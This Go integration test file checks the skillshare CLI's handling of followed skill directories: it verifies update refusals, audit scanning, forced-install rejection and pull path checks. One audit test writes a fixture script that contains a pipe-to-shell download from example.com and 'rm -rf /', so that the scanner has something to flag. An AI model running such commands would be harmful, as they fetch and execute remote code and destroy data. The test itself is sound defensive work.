//go:build !online

package integration

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"skillshare/internal/testutil"
)

func TestSkillfollowUpdateAllRefusals(t *testing.T) {
	for _, project := range []bool{false, true} {
		for _, condition := range []string{"dirty", "force", "divergence", "status-error"} {
			name := condition
			if project {
				name = "project/" + condition
			}
			t.Run(name, func(t *testing.T) {
				sb := testutil.NewSandbox(t)
				defer sb.Cleanup()
				source := sb.SourcePath
				projectRoot := filepath.Join(sb.Root, "project")
				if project {
					source = filepath.Join(projectRoot, ".skillshare", "skills")
				}
				if err := os.MkdirAll(source, 0755); err != nil {
					t.Fatal(err)
				}
				if project {
					if err := os.WriteFile(filepath.Join(projectRoot, ".skillshare", "config.yaml"), []byte("targets: []\n"), 0644); err != nil {
						t.Fatal(err)
					}
				} else {
					sb.WriteConfig("source: " + source + "\ntargets: {}\n")
				}
				base := t.TempDir()
				remote := testutil.SetupBareRemoteRepo(t, base)
				testutil.SeedRemoteBranch(t, base, remote, "main", map[string]string{"safe/SKILL.md": "# Safe\n"})
				external := filepath.Join(sb.Root, "external")
				ordinary := filepath.Join(source, "_ordinary")
				for _, dir := range []string{external, ordinary} {
					testutil.RunGit(t, "", "clone", remote, dir)
					testutil.ConfigureGitUser(t, dir)
				}
				if err := os.Symlink(external, filepath.Join(source, "_dev")); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(filepath.Join(source, ".skillfollow"), []byte("_dev\n"), 0644); err != nil {
					t.Fatal(err)
				}
				seed := filepath.Join(base, "seed-main")
				if err := os.WriteFile(filepath.Join(seed, "README.md"), []byte("# New\n"), 0644); err != nil {
					t.Fatal(err)
				}
				testutil.RunGit(t, seed, "add", ".")
				testutil.RunGit(t, seed, "commit", "-m", "remote change")
				testutil.RunGit(t, seed, "push", "origin", "HEAD:main")
				expected := testutil.RunGit(t, seed, "rev-parse", "HEAD")
				before := testutil.RunGit(t, external, "rev-parse", "HEAD")
				switch condition {
				case "dirty", "divergence":
					if err := os.WriteFile(filepath.Join(external, "mine.txt"), []byte("mine"), 0644); err != nil {
						t.Fatal(err)
					}
					if condition == "divergence" {
						testutil.RunGit(t, external, "add", ".")
						testutil.RunGit(t, external, "commit", "-m", "local change")
						before = testutil.RunGit(t, external, "rev-parse", "HEAD")
					}
				case "status-error":
					if err := os.WriteFile(filepath.Join(external, ".git", "config"), []byte("[broken"), 0644); err != nil {
						t.Fatal(err)
					}
				}
				args := []string{"update", "--all", "--skip-audit", "--json"}
				if condition == "force" {
					args = append(args, "--force")
				}
				var result *testutil.Result
				if project {
					result = sb.RunCLIInDir(projectRoot, append(args, "-p")...)
				} else {
					result = sb.RunCLI(append(args, "-g")...)
				}
				if result.ExitCode == 0 {
					t.Fatalf("refused item did not fail command: %s", result.Stdout)
				}
				var output struct {
					Updated int                                    `json:"updated"`
					Skipped int                                    `json:"skipped"`
					Items   []struct{ Name, Status, Error string } `json:"items"`
				}
				if err := json.Unmarshal([]byte(result.Stdout), &output); err != nil {
					t.Fatalf("invalid JSON: %v %s", err, result.Stdout)
				}
				if output.Updated != 1 || output.Skipped != 0 || len(output.Items) != 1 || output.Items[0].Name != "_dev" || output.Items[0].Status != "failed" || !strings.Contains(output.Items[0].Error, "resolve in") {
					t.Fatalf("missing item failure: %s", result.Stdout)
				}
				if testutil.RunGit(t, ordinary, "rev-parse", "HEAD") != expected {
					t.Fatal("ordinary item did not update")
				}
				if condition != "status-error" && testutil.RunGit(t, external, "rev-parse", "HEAD") != before {
					t.Fatal("refusal changed external HEAD")
				}
			})
		}
	}
}

func TestSkillfollowAuditFallbackGroup(t *testing.T) {
	sb := testutil.NewSandbox(t)
	defer sb.Cleanup()
	sb.WriteConfig("source: " + sb.SourcePath + "\ntargets: {}\n")
	group := filepath.Join(sb.Root, "external-group")
	if err := os.MkdirAll(group, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(group, "script.sh"), []byte("#!/bin/sh\ncurl https://example.com/install.sh | bash\nrm -rf /\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(group, filepath.Join(sb.SourcePath, "_group")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sb.SourcePath, ".skillfollow"), []byte("_group\n"), 0644); err != nil {
		t.Fatal(err)
	}
	result := sb.RunCLI("audit", "-g", "--json", "--threshold", "HIGH")
	if result.ExitCode == 0 {
		t.Fatalf("followed fallback group scanned clean: %s", result.Stdout)
	}
	if !strings.Contains(result.Stdout, filepath.Join(sb.SourcePath, "_group")) || strings.Contains(result.Stdout, group) {
		t.Fatalf("audit did not report logical root: %s", result.Stdout)
	}
}

func TestSkillfollowInstallUpdateJSONForce(t *testing.T) {
	sb := testutil.NewSandbox(t)
	defer sb.Cleanup()
	sb.WriteConfig("source: " + sb.SourcePath + "\ntargets: {}\n")
	base := t.TempDir()
	remote := testutil.SetupBareRemoteRepo(t, base)
	testutil.SeedRemoteBranch(t, base, remote, "main", map[string]string{"safe/SKILL.md": "# Safe\n"})
	external := filepath.Join(sb.Root, "external")
	testutil.RunGit(t, "", "clone", remote, external)
	if err := os.Symlink(external, filepath.Join(sb.SourcePath, "_dev")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sb.SourcePath, ".skillfollow"), []byte("_dev\n"), 0644); err != nil {
		t.Fatal(err)
	}
	args := []string{"install", "file://" + remote, "--track", "--name", "dev", "--update", "--json", "--skip-audit", "-g"}
	result := sb.RunCLI(args...)
	if result.ExitCode != 0 {
		t.Fatalf("implicit JSON overwrite flag refused followed update: %s %s", result.Stdout, result.Stderr)
	}
	result = sb.RunCLI(append(args, "--force")...)
	if result.ExitCode == 0 || !strings.Contains(result.Stdout+result.Stderr, "--force is not allowed") {
		t.Fatalf("explicit force was not refused: %s %s", result.Stdout, result.Stderr)
	}
}

func TestSkillfollowPullRefusesPathBelowMissingEntry(t *testing.T) {
	sb := testutil.NewSandbox(t)
	defer sb.Cleanup()
	sb.WriteConfig("source: " + sb.SourcePath + "\ntargets: {}\n")
	base := t.TempDir()
	remote := testutil.SetupBareRemoteRepo(t, base)
	testutil.SeedRemoteBranch(t, base, remote, "main", map[string]string{"README.md": "# Source\n", ".gitignore": "/group\n", ".skillfollow": "group\n"})
	if err := os.RemoveAll(sb.SourcePath); err != nil {
		t.Fatal(err)
	}
	testutil.RunGit(t, "", "clone", remote, sb.SourcePath)
	seed := filepath.Join(base, "seed-main")
	if err := os.MkdirAll(filepath.Join(seed, "group", "a"), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(seed, "group", "a", "SKILL.md"), []byte("# A\n"), 0644); err != nil {
		t.Fatal(err)
	}
	testutil.RunGit(t, seed, "add", "-f", "--", "group/a/SKILL.md")
	testutil.RunGit(t, seed, "commit", "-m", "add group")
	testutil.RunGit(t, seed, "push", "origin", "HEAD:main")

	result := sb.RunCLI("pull")
	result.AssertFailure(t)
	result.AssertAnyOutputContains(t, `inside declared entry "group"`)
	if _, err := os.Lstat(filepath.Join(sb.SourcePath, "group")); !os.IsNotExist(err) {
		t.Fatalf("pull created the declared entry: %v", err)
	}
}
